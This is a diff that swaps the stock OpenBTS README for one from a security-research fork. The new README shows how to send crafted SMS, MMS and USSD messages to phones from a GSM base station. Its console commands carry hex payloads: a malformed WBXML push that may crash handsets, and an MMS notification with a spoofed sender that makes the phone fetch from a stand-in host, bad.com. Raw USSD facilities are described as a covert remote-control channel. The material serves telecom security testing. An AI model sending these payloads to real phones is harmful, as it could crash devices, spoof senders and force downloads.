@@ -1,180 +1,80 @@
-Welcome to the OpenBTS source code.
+# OpenBTS
+
+OpenBTS fork with a few extras for SMS/MMS/USSD testing. Ensure you have a GSM licence first.
+https://www.contextis.com/resources/blog/binary-sms-old-backdoor-your-new-thing/
+
+ - MT SMS/MMS with custom TPDUs
+ - MT USSD with custom facilities
+
+This took months to get right. GSM is *ridiculously* complicated but stubborn persistence, wireshark and ignorance pays off eventually...
+The scripts we use to send SMS, MMS & USSD PDUs are not included.
+
+## Setup
+http://openbts.org/w/index.php?title=BuildInstallRun
+```
+git clone https://github.com/RangeNetworks/dev.git
+cd dev
+./clone.sh
+./switchto.sh master
+./build.sh B200
+rm -rf openbts
+git clone https://github.com/ctxis/openbts.git
+cd openbts
+make
+```
+## Logging
+Run wireshark on loopback with filter 'gsm_sms'
+```
+OpenBTS> rawconfig.GSMTAP.TargetIP 127.0.0.1
+OpenBTS> rawconfig Control.GSMTAP.GSM 1
+```
+Also enable SMS logging then tail logs:
+```
+OpenBTS> rawconfig Log.Level.L3SMSControl.cpp DEBUG
+tail -f /var/log/OpenBTS.log | grep -i SMS
+```
+
+## Mobile Terminated SMS
+
+### Hello from 12345
+```
+OpenBTS> rawconfig SMS.MIMEType text/plain
+OpenBTS> sendsms 23415914952xxxx 12345 Hello
+```
+### Multipart 8-bit WSP Push with UDH header and (malformed) WBXML
+Header is a Lebara WBXML config message but body is garbage. This could crash your phone.
+```
+OpenBTS> rawconfig SMS.UDHI 1
+OpenBTS> rawconfig SMS.DCS 4
+OpenBTS> rawconfig SMS.MIMEType application/vnd.3gpp.sms
+SMS.MIMEType changed from "text/plain" to "application/vnd.3gpp.sms"
+OpenBTS> sendsms 2341591721xxxx 12345 0B05040B8423F00003AA02017468697320697320612074657374206f6620636f6e636174656e617465642062696e61727920534d532077697468206120554448206865616465722e20496620796f752063616e207265616420746869
+OpenBTS> sendsms 23415917212xxxx 12345 0B05040B8423F00003AA02027320796f752070726f6261626c792077616e7420746f206368616e67652074686520706f7274206e756d62657273206e6f7720616e6420646f20736f6d657468696e67206e61737479
+```
+
+### Notify MMS, 8-bit, .vcf contact card with UDH header and spoofed originator
+This will trigger a download from http://bad.com/x.php if you have mobile data on. WiFi doesn't count.
+You can DL MMS Multimedia from *anywhere* on the internet which is dangerous/great!
+A .mms file download needs to be specially formatted but this is beyond the scope of OpenBTS.
+```
+OpenBTS> sendsms 23415917212xxxx 12345 0B05040B8423F000039001010f0603beaf848c8298393039303930008d908919802b31323334352f545950453d504c4d4e008a808e0201d888058103ffffff83687474703a2f2f6261642e636f6d2f782e7068703f393039303930009580
+```
+## Mobile Terminated USSD
+Normally USSD codes like *#100# are used from the MS (Mobile originated / MO) but they can come from the network (MT). They're used by disaster warning systems and third world banking apps. A notify facility (0x3d) creates a pop-up msg, a request facility (0x3c) creates a pop-up form which returns the response as a notify. Custom facilities implemented by networks get parsed in the background without prompting the user making this a powerful and little known remote control protocol.
+
+USSD Wireshark filter:
+```
+gsmtap.chan_type == 7 && !icmp
+```
+
+### "Godzilla! run for your lives!" notify facility
+```
+sendss 23415917212xxxx "Godzilla! run for your lives!" 0
+```
+### "Godzilla! run for your lives!" as a raw facility including headers
+```
+OpenBTS> sendss 23415917212xxxx a12a02013702013d30220401ff041d476f647a696c6c612c2072756e20666f7220796f7572206c6976657321 1
+```
 
 
-For free support, please subscribe to openbts-discuss@lists.sourceforge.net.
-See http://sourceforge.net/mailarchive/forum.php?forum_name=openbts-discuss
-and https://lists.sourceforge.net/lists/listinfo/openbts-discuss for details.
 
-A5/3 support requires installation of liba53.  This can be installed from:
-git@github.com:RangeNetworks/liba53.git
-
-Starting with release 4, OpenBTS requires zeromq (zmq).  This can be installed by running:
-$ sudo ./NodeManager/install_libzmq.sh
-
-For additional information, refer to http://openbts.org.
-
-
-These are the directories:
-
-AsteriskConfig	Asterisk configuration files for use with OpenBTS.
-CommonLib	Common-use libraries, mostly C++ wrappers for basic facilities.
-Control		Control-layer functions for the protocols of GSM 04.08 and SIP.
-GSM		The GSM stack.
-RRLP		Radio Resource Location Protocol
-SIP		Components of the SIP state machines ued by the control layer.
-SMS		The SMS stack.
-SR		The subscriber registry.
-TRXManager	The interface between the GSM stack and the radio.
-Transceiver	The software transceiver and specific installation tests.
-apps		OpenBTS application binaries.
-doc		Project documentation.
-tests		Test fixtures for subsets of OpenBTS components.
-smqueue		RFC-3428 store-and-forward server for SMS
-
-
-
-By default, OpenBTS assumes the following UDP port assignments:
-
-5060 -- Asterisk SIP interface
-5061 -- local SIP softphone
-5062 -- OpenBTS SIP interface
-5063 -- smqueue SIP interface
-5064 -- subscriber registry SIP interface
-5700-range -- OpenBTS-transceiver interface
-
-These can be controlled in the CONFIG table in /etc/OpenBTS.db.
-
-Standrd paths:
-/OpenBTS -- Binary installation and authorization keys.
-/etc/OpenBTS -- Configuration databases.
-/var/run/ -- Real-time reporting databases.
-
-The script apps/setUpFiles.sh will create these directories and install the
-correct files in them.
-
-
-Releases 2.5 and later include the smqueue SMS server.  It is NOT part of the
-normal GNU build process with the rest of OpenBTS.  To build smqueue, go
-into the smqueue directory and just type "make -f Makefile.standalone".
-
-
-
-Release history:
-
-Release	Name		SVN Reposiory	SVN Rev	Comments
-
-1.0	(none)		SF.net		??		completed L1, L2
-
-1.1	Arnaudville	GNU Radio	r10019 (trunk)
-
-1.2	Breaux Bridge	GNU Radio	r10088 (trunk)	GNU Build, very early assignment
-
-1.3	Carencro	KSP		r1 (trunk)	first post-injunction release
-
-1.4	Donaldsonville	KSP		r23 (trunk)	fixed Ubuntu build error
-
-1.5	Eunice		KSP		r39 (trunk)	fixed L2 bugs related to segmentation
-							removed incomplete SMS directory
-							moved "abort" calls into L3 subclasses
-
-1.6	New Iberia	KSP		r130 (trunk)	import of all 2.2 improvements to non-SMS release
-
-
-2.0	St. Francisville KSP		r54 (smswork)	SMS support
-							file-based configuration
-
-2.1	Grand Coteau	KSP		r70 (smswork)	DTMF support
-							fixed more Linux-related build errors
-								-lpthread
-								TLMessage constructor
-							expanded stack to prevent overflows in Linux
-							moved gSIPInterface to main app
-							fixed iterator bug in Pager
-
-2.2	Houma		KSP		r122 (smswork)	added LEGAL notice
-							removed Assert classes
-							stop paging on page response
-							fixed Pager-spin bug
-							fixed Transceiver spin bugs
-							fixed 2^32 microsecond rollover bug
-							reduced stack footprints in Transceiver
-							fixed SMS timestamps
-							check LAI before using TMSI in LUR
-							reduced memory requirement by 75%
-							removed PagerTest
-							fixed stale-transaction bug in paging handler
-							fixed USRP clock rollover bug
-							faster call connection
-							new USRPDevice design
-
-2.3	Jean Lafitte	KSP		r190? (trunk)	check for out-of-date RACH bursts
-							better TRX-GSM clock sync
-							formal logging system
-							command line interface
-							emergency call setup
-
-2.4	Kinder		KSP		r208? (trunk)	fixed BCCH neighbor list bug
-							support for neighbor lists
-							fixed support for non-local Asterisk servers
-							cleaner configuration management
-							more realtime control of BCCH parameters
-							proper rejection of Hold messages
-							fixed L3 hanging bug in MTDCheckBYE
-
-2.4.1	Kinder		KSP		r462		fixed lots of valgrind errors
-
-2.4.2	Kinder		KSP		r482		zero-length calling party number bug
-							g++ 4.4 #includes
-
-2.5	Lacassine	KSP		r551		imported Joshua Lackey patches
-							SIP fixes from Anne Kwong
-							SIP fixes from testing with SMS server
-							L3 TI handling fixes
-							SMS server support
-							GNU Radio 3.2 compatibility
-							configurable max range and LU-reject cause
-							"page" & "testcall" CLI features
-
-2.5.1	Lacassine	KSP		r595		fixed some build bugs for some Linux distros
-
-2.5.2	Lacassine	KSP		r630		fixed channel assignment bug for Nokia DCT4+ handsets
-
-2.5.3	Lacassine	KSP		r756		merged fix for transceiver startup crash
-								due to use of uninitialized variables (r646)
-							merged fix for fusb bug from trunk (r582)
-
-2.5.4	Lacassine	KSP		r812		merged fixes to build under latest Fedora and
-								to build with git GnuRadio (r814)
-
-2.6	Mamou		KSP		r886		fixed infamous fusb bug (r582)
-							fixed idle-filling table size bug
-							smoother uplink power control
-							load-limiting downlink power control
-							new "config" features (optional, static)
-							IMEI interrogation
-							fixed MOD "missing FIFO" bug
-							configurable short code features
-							fixed transceiver startup crash (r646)
-							readline support is back
-							fixed timing advance bug (r844)
-							added CLI "chans" command
-							track time-of-use in TMSI table (r844)
-							added CLI "noise" command (r844)
-							added CLI "rxpower" command (r844)
-							added CLI "unconfig" command
-
-2.7	Natchitoches	Range	rxxx			converted TMSITable to sqlite3 (r902)
-							sqlite3-based configuration (r???)
-							converted Logger to syslogd (r903)
-							added support for rest octets (r1022)
-							external database for transaction reporting (r1184)
-							external database for channel status reporting (r1203)
-							in-call delivery and submission of text messages (r1231)
-							RFC-2833 DMTF (r1249)
-
-2.8	Opelousas	Range	rxxx			added SHA1/RSA image verification
-							move databases to /etc and /var
-							SIP-based authentication
-
-2.9	Plaquemine	Range				socket-based remote CLI
-							merge-in of "S" Release
